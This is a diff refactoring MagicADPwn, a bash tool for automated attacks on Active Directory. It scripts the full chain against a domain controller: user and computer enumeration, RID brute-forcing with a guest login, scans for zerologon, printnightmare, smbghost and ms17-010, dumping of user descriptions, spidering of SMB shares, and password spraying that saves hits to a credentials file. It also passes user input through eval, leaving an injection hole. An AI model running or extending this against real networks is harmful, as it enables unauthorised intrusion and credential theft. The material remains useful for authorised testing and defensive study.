@@ -7,21 +7,46 @@ BASE_DIR="$HOME/.magicadpwn"
 LOG_DIR="$BASE_DIR/logs"
 REPORT_DIR="$BASE_DIR/reports"
 
+# --- Helper Functions --- #
+
 # Function to ensure a directory exists
 ensure_dir_exists() {
   local dir="$1"
   if [[ ! -d "$dir" ]]; then
     mkdir -p "$dir" || {
-      echo "[ERROR] Failed to create directory: $dir. Check permissions."
+      print_error "Failed to create directory: $dir. Check permissions."
       exit 1
     }
   fi
 }
 
-# Ensure necessary directories exist
-ensure_dir_exists "$BASE_DIR"
-ensure_dir_exists "$LOG_DIR"
-ensure_dir_exists "$REPORT_DIR"
+print_banner() {
+  echo -e "\n${BLUE}==============================${RESET}"
+  echo -e "${GREEN}       MagicADPwn v1.0       ${RESET}"
+  echo -e "${BLUE}==============================${RESET}\n"
+}
+
+print_section() {
+  local title="$1"
+  echo -e "\n${BLUE}========== ${title} ==========${RESET}"
+}
+
+print_info() {
+  local msg="$1"
+  echo -e "${GREEN}[INFO]${RESET} ${msg}"
+}
+
+print_warning() {
+  local msg="$1"
+  echo -e "${RED}[WARNING]${RESET} ${msg}"
+}
+
+print_error() {
+  local msg="$1"
+  echo -e "${RED}[ERROR]${RESET} ${msg}"
+}
+
+# --- End Helper Functions --- #
 
 # Colors for output
 RED='\033[0;31m'
@@ -29,31 +54,36 @@ GREEN='\033[0;32m'
 BLUE='\033[0;34m'
 RESET='\033[0m'
 
-# Display banner
-echo -e "${BLUE}==============================${RESET}"
-echo -e "${GREEN}       MagicADPwn v1.0       ${RESET}"
-echo -e "${BLUE}==============================${RESET}"
+# Ensure necessary directories exist
+ensure_dir_exists "$BASE_DIR"
+ensure_dir_exists "$LOG_DIR"
+ensure_dir_exists "$REPORT_DIR"
+
+# Print the banner
+print_banner
 
 # Usage function
 usage() {
-  echo "MagicADPwn - Automated AD Enumeration & Exploitation"
-  echo ""
-  echo "Usage: $0 -t <target_ip/hostname> [-u <username>] [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v]"
-  echo ""
-  echo "Required:"
-  echo "  -t, --target       Target Domain Controller IP/hostname"
-  echo ""
-  echo "Optional:"
-  echo "  -u, --user         Username (default: guest/anonymous)"
-  echo "  -p, --pass         Password"
-  echo "  -H, --hash         NTLM hash"
-  echo "  -k, --kerberos     Use Kerberos authentication"
-  echo "      --no-pass      Skip password/hash when using Kerberos"
-  echo "      --local-auth   Use local authentication"
-  echo "  --no-recon         Skip reconnaissance phase"
-  echo "  --report <format>  Generate report (json, csv, markdown, html)"
-  echo "  -v, --verbose      Enable verbose output"
-  echo ""
+  cat <<EOF
+MagicADPwn - Automated AD Enumeration & Exploitation
+
+Usage: $0 -t <target_ip/hostname> [-u <username>] [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v]
+
+Required:
+  -t, --target       Target Domain Controller IP/hostname
+
+Optional:
+  -u, --user         Username (default: guest/anonymous)
+  -p, --pass         Password
+  -H, --hash         NTLM hash
+  -k, --kerberos     Use Kerberos authentication
+      --no-pass      Skip password/hash when using Kerberos
+      --local-auth   Use local authentication
+  --no-recon         Skip reconnaissance phase
+  --report <format>  Generate report (json, csv, markdown, html)
+  -v, --verbose      Enable verbose output
+
+EOF
   exit 0
 }
 
@@ -120,7 +150,7 @@ while [[ "$#" -gt 0 ]]; do
       usage
       ;;
     *)
-      echo -e "${RED}[ERROR]${RESET} Unknown option: $1"
+      print_error "Unknown option: $1"
       usage
       ;;
   esac
@@ -128,98 +158,88 @@ done
 
 # Ensure a target is provided
 if [[ -z "$TARGET" ]]; then
-  echo -e "${RED}[ERROR]${RESET} Target (-t) is required."
+  print_error "Target (-t) is required."
   usage
   exit 1
 fi
 
 # Default to guest/anonymous authentication if no credentials are provided
 if [[ -z "$USERNAME" ]]; then
-  echo "No username provided, attempting guest/anonymous authentication."
+  print_info "No username provided, attempting guest/anonymous authentication."
   USERNAME="guest"
 fi
 
 # Default to empty password if no password is provided
 if [[ -z "$PASSWORD" ]]; then
   PASSWORD=""
-  # also set $NO_PASS
   NO_PASS=true
 fi
 
-# Default to empty password if --no-pass is set
+# If --no-pass is set, force empty password
 if [[ "$NO_PASS" == true ]]; then
   PASSWORD=""
 fi
 
-# Function to check if the target is reachable
+# --- Functions for Enumeration and Exploitation --- #
+
 check_target_reachable() {
   local target="$1"
   if [[ -z "$target" ]]; then
-    echo -e "${RED}[ERROR]${RESET} No target specified for reachability check."
+    print_error "No target specified for reachability check."
     exit 1
   fi
 
-  # List of ports to check (e.g., SMB and LDAP)
   local ports=(445 389)
   for port in "${ports[@]}"; do
     if timeout 1 bash -c "echo >/dev/tcp/${target}/${port}" 2>/dev/null; then
-      echo -e "${GREEN}[INFO]${RESET} Target ${target} is reachable on port ${port}."
+      print_info "Target ${target} is reachable on port ${port}."
       return 0
     fi
   done
 
-  echo -e "${RED}[ERROR]${RESET} Target ${target} is not reachable on ports ${ports[*]}."
-  echo "exiting ..."
+  print_error "Target ${target} is not reachable on ports ${ports[*]}."
+  print_error "Exiting..."
   exit 1
 }
 
-# Function to check if a port is open
 check_port() {
   local target="$1"
   local port="$2"
   timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && return 0 || return 1
 }
 
-# Function to dynamically generate an entry for /etc/hosts
 generate_hosts_file() {
   local target="$1"
   if [[ -z "$target" ]]; then
-    echo -e "${RED}[ERROR]${RESET} No target specified for generating hosts file."
+    print_error "No target specified for generating hosts file."
     return 1
   fi
 
-  echo -e "${GREEN}[INFO]${RESET} Generating hosts file for target ${target}..."
+  print_section "Generating Hosts File"
+  print_info "Generating hosts file for target ${target}..."
   local tmpfile
-  tmpfile=$(mktemp) || { echo -e "${RED}[ERROR]${RESET} Failed to create temporary file."; return 1; }
+  tmpfile=$(mktemp) || { print_error "Failed to create temporary file."; return 1; }
 
-  # Generate the hosts file using nxc smb and write to a temporary file
   if nxc smb "$target" --generate-hosts-file "$tmpfile"; then
-    echo -e "${GREEN}[INFO]${RESET} Appending new hosts entries to /etc/hosts..."
+    print_info "Appending new hosts entries to /etc/hosts..."
     while IFS= read -r line; do
-      # Skip empty lines
-      if [[ -z "$line" ]]; then
-        continue
-      fi
-
-      # Check if the exact entry already exists in /etc/hosts
+      [[ -z "$line" ]] && continue
       if ! grep -Fxq "$line" /etc/hosts; then
         echo "$line" >> /etc/hosts
-        echo -e "${GREEN}[INFO]${RESET} Added: $line"
+        print_info "Added: $line"
       else
-        echo -e "${BLUE}[INFO]${RESET} Already exists: $line"
+        print_info "Already exists: $line"
       fi
     done < "$tmpfile"
-
     rm "$tmpfile"
-    echo -e "${GREEN}[INFO]${RESET} /etc/hosts updated successfully."
+    print_info "/etc/hosts updated successfully."
   else
-    echo -e "${RED}[ERROR]${RESET} nxc smb failed to generate hosts file for $target."
+    print_error "nxc smb failed to generate hosts file for $target."
     rm "$tmpfile"
     return 1
   fi
 }
 
-# Function to dynamically get the domain name
 get_domain() {
   local target="$1"
   if [[ -z "$target" ]]; then
@@ -227,7 +247,6 @@ get_domain() {
     return 1
   fi
 
-  # Run nxc smb and capture output; suppress error output for clarity
   local output
   output=$(nxc smb "$target" 2>/dev/null)
   if [[ -z "$output" ]]; then
@@ -235,7 +254,6 @@ get_domain() {
     return 1
   fi
 
-  # Extract the domain using grep with a Perl regex that matches text after '(domain:'
   local domain
   domain=$(echo "$output" | grep -oP "\(domain:\K[^)]+")
   if [[ -z "$domain" ]]; then
@@ -246,7 +264,6 @@ get_domain() {
   echo "$domain"
 }
 
-# Function to retrieve a list of computers from Active Directory
 enumerate_computers() {
   local target="$1"  # Target DC's IP address
   local user="$2"
@@ -254,57 +271,39 @@ enumerate_computers() {
   local hash="$4"
   local kerberos="$5"
 
-  # Automatically retrieve domain if not provided
   if [[ -z "$DOMAIN" ]]; then
     DOMAIN=$(get_domain "$target")
     if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
-      echo -e "${RED}[ERROR]${RESET} Unable to retrieve domain name from $target. Please specify DOMAIN manually."
+      print_error "Unable to retrieve domain name from $target. Please specify DOMAIN manually."
       exit 1
     else
-      echo -e "${GREEN}[INFO]${RESET} Retrieved domain: $DOMAIN"
+      print_info "Retrieved domain: $DOMAIN"
     fi
   fi
 
-  # Build positional argument as "domain[/username[:password]]"
   local pos_arg="$DOMAIN"
   if [[ -n "$user" ]]; then
     pos_arg+="/$user"
-    # Append password only if provided and not using hash authentication
     if [[ -n "$pass" && -z "$hash" ]]; then
       pos_arg+=":$pass"
     fi
   fi
 
-  # Build command with flags preceding the positional argument
-  local cmd="GetADComputers.py"
-  cmd+=" -dc-ip ${target}"
-  if [[ "$NO_PASS" == true ]]; then
-    cmd+=" -no-pass"
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -hashes $hash"
-  fi
-  if [[ "$kerberos" == "true" ]]; then
-    cmd+=" -k"
-  fi
-
-  # Append the positional argument
+  local cmd="GetADComputers.py -dc-ip ${target}"
+  [[ "$NO_PASS" == true ]] && cmd+=" -no-pass"
+  [[ -n "$hash" ]] && cmd+=" -hashes $hash"
+  [[ "$kerberos" == "true" ]] && cmd+=" -k"
   cmd+=" $pos_arg"
 
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
-  
-  # Capture output (including stderr) for error checking
+  print_info "Running: $cmd"
   local output
   output=$(eval "$cmd" 2>&1 | tr -d '\0')
-  
-  # If an LDAP bind error is detected, fallback to RID brute method
   if echo "$output" | grep -q "Error in searchRequest"; then
-    echo -e "${RED}[WARNING]${RESET} GetADComputers.py failed with a bind error."
+    print_warning "GetADComputers.py failed with a bind error."
     return
   fi
 }
 
-# Function to retrieve a list of users from Active Directory
 enumerate_users() {
   local target="$1"  # target DC's IP address
   local user="$2"
@@ -312,20 +311,17 @@ enumerate_users() {
   local hash="$4"
   local kerberos="$5"
 
-  # Automatically retrieve domain if not provided using get_domain()
   if [[ -z "$DOMAIN" ]]; then
     DOMAIN=$(get_domain "$target")
     if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
-      echo -e "${RED}[ERROR]${RESET} Unable to retrieve domain name from $target. Please specify DOMAIN manually."
+      print_error "Unable to retrieve domain name from $target. Please specify DOMAIN manually."
       exit 1
     else
-      echo -e "${GREEN}[INFO]${RESET} Retrieved domain: $DOMAIN"
+      print_info "Retrieved domain: $DOMAIN"
     fi
   fi
 
-  echo -e "${GREEN}[INFO]${RESET} Enumerating users on Active Directory..."
-
-  # Build positional argument as "domain[/username[:password]]"
+  print_section "Enumerating Users on Active Directory"
   local pos_arg="$DOMAIN"
   if [[ -n "$user" ]]; then
     pos_arg+="/$user"
@@ -334,58 +330,45 @@ enumerate_users() {
     fi
   fi
 
-  # Build command with flags preceding the positional argument
-  local cmd="GetADUsers.py -all"
-  cmd+=" -dc-ip ${target}"
-  if [[ "$NO_PASS" == true ]]; then
-    cmd+=" -no-pass"
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -hashes $hash"
-  fi
-  if [[ "$kerberos" == "true" ]]; then
-    cmd+=" -k"
-  fi
+  local cmd="GetADUsers.py -all -dc-ip ${target}"
+  [[ "$NO_PASS" == true ]] && cmd+=" -no-pass"
+  [[ -n "$hash" ]] && cmd+=" -hashes $hash"
+  [[ "$kerberos" == "true" ]] && cmd+=" -k"
   cmd+=" $pos_arg"
 
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
-  
-  # Capture output (including stderr) for error checking
+  print_info "Running: $cmd"
   local output
   output=$(eval "$cmd" 2>&1 | tr -d '\0')
-  
-  # If an LDAP bind error is detected, fallback to RID brute method
   if echo "$output" | grep -q "Error in searchRequest"; then
-    echo -e "${RED}[WARNING]${RESET} GetADUsers.py failed with a bind error. Falling back to RID brute method..."
+    print_warning "GetADUsers.py failed with a bind error. Falling back to RID brute method..."
     enumerate_users_alternative "$target"
     return
   fi
 
-  # Process, save, and pretty print the user list
   echo "$output" | grep -vE '^(Impacket|\[\*|Name|-------------------)' | awk 'NF {print $1}' | sed '/^$/d' > "$BASE_DIR/users.txt"
-  echo -e "${GREEN}[INFO]${RESET} User list saved to $BASE_DIR/users.txt"
-  echo -e "${BLUE}-------------------- User List --------------------${RESET}"
+  print_info "User list saved to $BASE_DIR/users.txt"
+  print_section "User List"
   cat "$BASE_DIR/users.txt"
 }
 
 enumerate_users_alternative() {
   local target="$1"  # target DC's IP address
-  echo -e "${GREEN}[INFO]${RESET} Running RID brute user enumeration with nxc smb..."
+  print_section "RID Brute User Enumeration"
+  print_info "Running RID brute user enumeration with nxc smb..."
   
   nxc smb "$target" -u guest -p '' --rid-brute 20000 | \
     grep -oP '(?<=\\)[A-Za-z0-9._-]+' | sed 's/:$//' | sort -u | \
     grep -v -E '^(Domain|Enterprise|krbtgt|Cert|Schema|Group|Read-only|Cloneable|Protected|Key|RAS|Allowed|Denied|DC\$|DnsAdmins|DnsUpdateProxy)$' > "$BASE_DIR/users.txt"
   
   if [[ -s "$BASE_DIR/users.txt" ]]; then
-    echo -e "${GREEN}[INFO]${RESET} User list retrieved via RID brute and saved to $BASE_DIR/users.txt"
-    echo -e "${BLUE}-------------------- User List --------------------${RESET}"
+    print_info "User list retrieved via RID brute and saved to $BASE_DIR/users.txt"
+    print_section "User List"
     cat "$BASE_DIR/users.txt"
   else
-    echo -e "${RED}[ERROR]${RESET} RID brute alternative method failed. No users retrieved."
+    print_error "RID brute alternative method failed. No users retrieved."
   fi
 }
 
-# Function to enumerate groups from Active Directory
 enumerate_groups() {
   local target="$1"
   local user="$2"
@@ -393,36 +376,28 @@ enumerate_groups() {
   local hash="$4"
   local groups_file="$BASE_DIR/groups.txt"
   
-  echo -e "${GREEN}[INFO]${RESET} Enumerating groups on Active Directory..."
+  print_section "Enumerating Groups on Active Directory"
+  local cmd="nxc smb \"$target\" --groups"
+  [[ -n "$user" ]] && cmd+=" -u \"$user\""
+  [[ -n "$pass" ]] && cmd+=" -p \"$pass\""
+  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
   
-  local cmd="nxc smb "$target" --groups"
-  
-  if [[ -n "$user" ]]; then
-    cmd+=" -u \"$user\""
-  fi
-  if [[ -n "$pass" ]]; then
-    cmd+=" -p \"$pass\""
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -H \"$hash\""
-  fi
-  
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  print_info "Running: $cmd"
   eval "$cmd" | tee "$groups_file"
-  echo -e "${GREEN}[INFO]${RESET} Group enumeration results saved to $groups_file"
+  print_info "Group enumeration results saved to $groups_file"
 }
 
-# Function for password spraying
 password_spray() {
   local target="$1"
   local users="$2"
   local passwords="$3"
   local creds_file="$BASE_DIR/creds.txt"
   
-  echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
+  print_section "Password Spraying"
+  print_info "Checking available authentication services on $target..."
   
   if check_port "$target" 445; then
-    echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
+    print_info "SMB (port 445) is open. Using SMB for authentication attempts."
     if [[ -n "$users" && -n "$passwords" ]]; then
       nxc smb "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$users" ]]; then
@@ -431,7 +406,7 @@ password_spray() {
       nxc smb "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     fi
   elif check_port "$target" 389; then
-    echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
+    print_info "LDAP (port 389) is open. Using LDAP for authentication attempts."
     if [[ -n "$users" && -n "$passwords" ]]; then
       nxc ldap "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$users" ]]; then
@@ -440,12 +415,11 @@ password_spray() {
       nxc ldap "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     fi
   else
-    echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
+    print_error "Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
     return 1
   fi
 }
 
-# Function to scan for known vulnerabilities
 scan_vulnerabilities() {
   local target="$1"
   local user="$2"
@@ -453,26 +427,17 @@ scan_vulnerabilities() {
   local hash="$4"
   local vuln_file="$BASE_DIR/vulnerabilities.txt"
 
-  echo -e "${GREEN}[INFO]${RESET} Scanning for known vulnerabilities on $target..."
-
+  print_section "Vulnerability Scanning"
   local cmd="nxc smb \"$target\" -M zerologon -M printnightmare -M smbghost -M ms17-010"
-
-  if [[ -n "$user" ]]; then
-    cmd+=" -u \"$user\""
-  fi
-  if [[ -n "$pass" ]]; then
-    cmd+=" -p \"$pass\""
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -H \"$hash\""
-  fi
-
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  [[ -n "$user" ]] && cmd+=" -u \"$user\""
+  [[ -n "$pass" ]] && cmd+=" -p \"$pass\""
+  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
+  
+  print_info "Running: $cmd"
   eval "$cmd" | tee "$vuln_file"
-  echo -e "${GREEN}[INFO]${RESET} Vulnerability scan results saved to $vuln_file"
+  print_info "Vulnerability scan results saved to $vuln_file"
 }
 
-# Function to dump user descriptions from Active Directory
 dump_user_descriptions() {
   local target="$1"
   local user="$2"
@@ -480,26 +445,17 @@ dump_user_descriptions() {
   local hash="$4"
   local desc_file="$BASE_DIR/user_descriptions.txt"
   
-  echo -e "${GREEN}[INFO]${RESET} Dumping user descriptions from Active Directory..."
-  
+  print_section "Dumping User Descriptions"
   local cmd="nxc ldap \"$target\" -M get-desc-users"
-
-  if [[ -n "$user" ]]; then
-    cmd+=" -u \"$user\""
-  fi
-  if [[ -n "$pass" ]]; then
-    cmd+=" -p \"$pass\""
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -H \"$hash\""
-  fi
-
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  [[ -n "$user" ]] && cmd+=" -u \"$user\""
+  [[ -n "$pass" ]] && cmd+=" -p \"$pass\""
+  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
+  
+  print_info "Running: $cmd"
   eval "$cmd" | tee "$desc_file"
-  echo -e "${GREEN}[INFO]${RESET} User descriptions saved to $desc_file"
+  print_info "User descriptions saved to $desc_file"
 }
 
-# Function to enumerate readable and writable SMB shares
 enumerate_smb_shares() {
   local target="$1"
   local user="$2"
@@ -507,26 +463,17 @@ enumerate_smb_shares() {
   local hash="$4"
   local shares_file="$BASE_DIR/smb_shares.txt"
   
-  echo -e "${GREEN}[INFO]${RESET} Enumerating readable and writable SMB shares..."
+  print_section "Enumerating SMB Shares"
+  local cmd="nxc smb \"$target\" --shares --filter-shares READ WRITE"
+  [[ -n "$user" ]] && cmd+=" -u \"$user\""
+  [[ -n "$pass" ]] && cmd+=" -p \"$pass\""
+  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
   
-  local cmd="nxc smb "$target" --shares --filter-shares READ WRITE"
-  
-  if [[ -n "$user" ]]; then
-    cmd+=" -u \"$user\""
-  fi
-  if [[ -n "$pass" ]]; then
-    cmd+=" -p \"$pass\""
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -H \"$hash\""
-  fi
-  
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  print_info "Running: $cmd"
   eval "$cmd" | tee "$shares_file"
-  echo -e "${GREEN}[INFO]${RESET} SMB share enumeration results saved to $shares_file"
+  print_info "SMB share enumeration results saved to $shares_file"
 }
 
-# Function to list all readable files using spider_plus
 enumerate_readable_files() {
   local target="$1"
   local user="$2"
@@ -534,74 +481,48 @@ enumerate_readable_files() {
   local hash="$4"
   local files_file="$BASE_DIR/readable_files.txt"
   
-  echo -e "${GREEN}[INFO]${RESET} Enumerating readable files on SMB shares..."
+  print_section "Enumerating Readable Files"
+  local cmd="nxc smb \"$target\" -M spider_plus"
+  [[ -n "$user" ]] && cmd+=" -u \"$user\""
+  [[ -n "$pass" ]] && cmd+=" -p \"$pass\""
+  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
   
-  local cmd="nxc smb "$target" -M spider_plus"
-  
-  if [[ -n "$user" ]]; then
-    cmd+=" -u \"$user\""
-  fi
-  if [[ -n "$pass" ]]; then
-    cmd+=" -p \"$pass\""
-  fi
-  if [[ -n "$hash" ]]; then
-    cmd+=" -H \"$hash\""
-  fi
-  
-  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  print_info "Running: $cmd"
   eval "$cmd" | tee "$files_file"
-  echo -e "${GREEN}[INFO]${RESET} Readable files enumeration results saved to $files_file"
+  print_info "Readable files enumeration results saved to $files_file"
 }
 
-# Ensure a target is provided
+# --- Main Logic --- #
+
 if [[ -z "$TARGET" ]]; then
-  echo -e "${RED}[ERROR]${RESET} Target (-t) is required."
+  print_error "Target (-t) is required."
   usage
   exit 1
 fi
 
-# Starting MagicADPwn ...
-echo "Starting MagicADPwn on $TARGET"
-
-# Check if the target is reachable. Otherwise exit.
+print_info "Starting MagicADPwn on $TARGET"
 check_target_reachable "$TARGET"
-
-# Dynamically generate an entry for /etc/hosts
 generate_hosts_file "$TARGET"
 
-# Dynamically retrieve the domain name
+# Dynamically retrieve the domain name and print it
 DOMAIN=$(get_domain "$TARGET")
 if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
-  echo -e "${RED}[ERROR]${RESET} Failed to retrieve domain from $TARGET."
+  print_error "Failed to retrieve domain from $TARGET."
   exit 1
 fi
-echo -e "${GREEN}[INFO]${RESET} Retrieved domain: ${DOMAIN}"
+print_info "Retrieved domain: ${DOMAIN}"
 
-# Enumerate computers from Active Directory
 enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
-
-# Enumerate users from Active Directory
 enumerate_users "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
-
-# Enumerate groups from Active Directory
 enumerate_groups "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
-
-# Scan for known vulnerabilities using provided credentials
 scan_vulnerabilities "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
-
-# Dump user descriptions from Active Directory
 dump_user_descriptions "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
-
-# Enumerate readable and writable SMB shares
 enumerate_smb_shares "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
-
-# Enumerate all readable files using spider_plus
 enumerate_readable_files "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
 
-# Determine authentication mode
 if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
   password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
   exit 0
 fi
 
-# Additional enumeration and exploitation logic will be added here
+# Additional enumeration and exploitation logic can be added here.
